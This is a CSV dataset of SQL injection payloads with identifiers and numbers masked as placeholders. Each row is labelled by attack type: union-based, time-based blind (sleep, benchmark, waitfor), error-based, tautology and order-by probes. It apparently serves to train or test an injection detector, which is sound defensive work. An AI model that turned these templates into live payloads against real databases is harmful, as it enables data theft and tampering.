payload_delex,type_id
"__INT__' ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
__INT__ and __INT__ = __INT__ -- __IDENT__,2
__INT__' or sleep ( __INT__ ) #,6
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and __IDENT__",6
"__INT__ % "" ) ) waitfor __IDENT__ __STR__ --",6
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__#",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
-8256__STR__lrtu__STR__lrtu,2
"__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' ) ) or __INT__ = __INT__ --,2
"__INT__' in __IDENT__ __IDENT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
waitfor __IDENT__ __STR__ and __STR__ = '__IDENT__,6
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"-__INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
-1064__STR__qojd__STR__qojd,2
"__INT__"" ) ) union all select null , null --",7
__INT__' ) ) ) and __INT__ = __INT__,2
"__INT__' in __IDENT__ __IDENT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) #",2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__#",7
"__INT__ and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
"__INT__"" ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__"" ) where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
-__INT__' or __INT__ = __INT__#,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ % ' ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
end and ( ( ( __STR__ like '__IDENT__,2
"__IDENT__ __IDENT__ __IDENT__ , __INT__ , __INT__?__IDENT__",0
-__INT__ ) ) ) order by __INT__#,0
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__",2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"end and ( ( ( __STR__ = ""__IDENT__",2
"__INT__"" ) where __INT__ = __INT__ order by __INT__ --",0
__INT__ or __INT__ = __INT__,2
-__INT__' ) ) ) or __INT__ = __INT__,2
__INT__' where __INT__ = __INT__ and __INT__ = __INT__ --,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
"__INT__ % "" and sleep ( __INT__ ) #",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
-3632__STR__lgpy__STR__lgpy,2
__INT__' ) rlike sleep ( __INT__ ) #,6
__INT__' ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__"" ) ) order by __INT__#",0
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ like '__IDENT__",2
"__INT__"" ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) # __IDENT__",6
__INT__ and __INT__ = __INT__#,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
1__STR__yqzq__STR__yqzq,2
"__INT__ % "" ) ) and __INT__ = __INT__ --",2
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__,2
__INT__ ) or sleep ( __INT__ ) #,6
-8665__STR__vbsy__STR__vbsy,2
"__INT__ ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __INT__ = __INT__",6
"__INT__ % __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and % __STR__",3
"__INT__ % ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
"__INT__' where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ like '__IDENT__",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( ( ( __INT__ = __INT__",2
"__INT__ ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( ( __IDENT__",3
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = '",2
"select __IDENT__ , __IDENT__ from __IDENT__ where sleep = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"-7065__STR__bdxr' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #,6
-__INT__ % __STR__ % __STR__,2
"__INT__ % ' ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__ --,2
"-__INT__ % "" ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__' ) ) ) union all select null , null , null , null , null , null , null --",7
"-__INT__ % ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( % __STR__",2
"__INT__' in __IDENT__ __IDENT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-__INT__' ) order by __INT__#,0
1__STR__akha__STR__akha,2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
"-__INT__ % ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( % __STR__",2
"__INT__"" ) ) ) union all select null , null , null , null , null , null#",7
__INT__ ) ) ) and __INT__ = __INT__#,2
select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,7
1__STR__gkyo__STR__gkyo,2
__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
__IDENT__ dbms_lock . sleep ( __INT__ ),6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null#",7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__"" ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__' ) or __INT__ = __INT__,2
-__INT__ ) ) order by __INT__ --,0
"__INT__"" where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__INT__ % ' ) ) and __INT__ = __INT__ --,2
1__STR__gywp__STR__gywp,2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ % ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( % __STR__",3
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"__INT__' in __IDENT__ __IDENT__ ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) #",2
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__' ) ) ) or __INT__ = __INT__ --,2
"__INT__ % ) ) ) or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( % __STR__",6
1__STR__hoyw__STR__hoyw,2
__IDENT__@__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__,0
"-__INT__ ) union all select __INT__ , __INT__ , __INT__#",7
waitfor __IDENT__ __STR__ if ( [__IDENT__] ) waitfor __IDENT__ __STR__,6
"__INT__"" ) where __INT__ = __INT__ and sleep ( __INT__ ) --",6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__,2
waitfor __IDENT__ __STR__,6
-__INT__' ) ) or __INT__ = __INT__,2
"__INT__' ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
-3555__STR__papr__STR__papr,2
"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"1__STR__hrpa' where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null --",7
"__INT__ % "" ) and __INT__ = __INT__#",2
-__INT__' ) ) ) or __INT__ = __INT__,2
-8040__STR__laar__STR__laar,2
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) or benchmark ( __INT__ , __IDENT__ ( __INT__ ) ) #",6
